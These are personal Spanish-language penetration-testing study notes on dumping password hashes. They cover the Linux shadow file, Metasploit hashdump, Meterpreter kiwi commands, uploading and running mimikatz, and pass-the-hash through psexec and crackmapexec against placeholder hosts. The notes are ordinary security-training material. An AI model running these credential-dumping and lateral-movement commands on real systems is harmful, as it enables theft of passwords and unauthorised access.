# Password Hashes

Propietario: Adrian Gisbert Cabello

# Linux

- Todas las contraseñas encriptadas de los usuarios están alojadas en el directorio `/etc/shadow`

- El hash va a tener un prefix (con el símbolo del dolar) que significa que tipo de hash es

![Untitled](Password%20Hashes%20aa37e1b128b34498862ad4f980e1f708/Untitled.png)

- También podemos dumpear los hashes de las contraseñas si tenemos una sesión de meterpreter con metasploit:
    - `search hashdump` | `use post/linux/gather/hashdump`
    - En las opciones tendremos que poner	la sesión del meterpreter y le damos a `run`

# Windows

Dos directorios donde podemos encontrar password hashes son:

- `C:\Panther\Unattend.xml`
- `C:\Panther\Autounattend.xml`

Los hashes LM suelen venir en 2 hashes (HASH1:HASH2) mientras que los hashes NTLM suele venir en un hash codificado en MD4

En una consola meterpreter podemos buscar los archivos: `search -f Unattend.xml` o bien entrando el el directorio con `cd`, descargamos el archivo a nuestro equipo con `download` y lo visualizamos

![Untitled](Password%20Hashes%20aa37e1b128b34498862ad4f980e1f708/Untitled%201.png)

- En este caso está encodeado en base64 porque la opción de `Plain text` está en `false`.

Para dumpear hashes de contraseñas podemos usar `kiwi`, en una sesión de meterpreter (antes tenemos que migrar el proceso lsass) escribimos: `load kiwi`:

- El menú de ayuda: `?`
- Para ver todas las credenciales: `creds_all`
- Para ver todos los hashes de passwords: `lsa_dump_sam`
- En algunos casos podemos ve los passwords en texto plano: `lsa_dump_secrets`

También podemos usar `Mimikatz` por si son hashes difíciles:

- Hacemos un upload del archivo mimikatz.exe de nuestra máquina linux al equipo víctima (en este caso Win x64):
- `cd C:\\` (Nos vamos al directorio raíz)
- `mkdir Temp` (Creamos una carpeta temporal para poder trabajar)
- `cd Temp`
- `upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe` (Directorio donde se encuentra el archivo en nuestra máquina Kali)
- `shell` (Abrimos una consola de comandos)
- `.\mimikatz.exe`
- Una vez estamos dentro de Mimikatz:
    - `lsadump::sam` (Nos da más información que `Kiwi`)
    - `lsadump::secrets`
    - `sekurlsa::logonpasswords` (Ver contraseñas en texto plano, si procede)

Para conectarnos mediante una sesión meterpreter con la técnica Pass-The-Hash Attack, y así pivotar a otro usuario sin tener credenciales en texto plano pero si en formato hash, abrimos metasploit y buscamos `search psexec`, y usamos el módulo `use exploit/windows/smb/psexec`

- `set SMBUser Administrator`
- `set SMBPass aadjrkv3fgdsjjkdbk584gd:e3cf5g89rtdsdfg5t5h5` (Password HASH)
- `set target Command` (Para ver todos los targets `set target`) podemos usar `set target Native \upload` para subir un payload

Si queremos conectarnos a través de crackmapexec con el password hash: `crackmapexec smb 192.168.X.X -u Administrator -H ¨HASH¨`

- Podemos ejecutar comandos con el parámetro -x: `crackmapexec smb 192.168.X.X -u Administrator -H ¨HASH¨` `-x ¨ipconfig¨`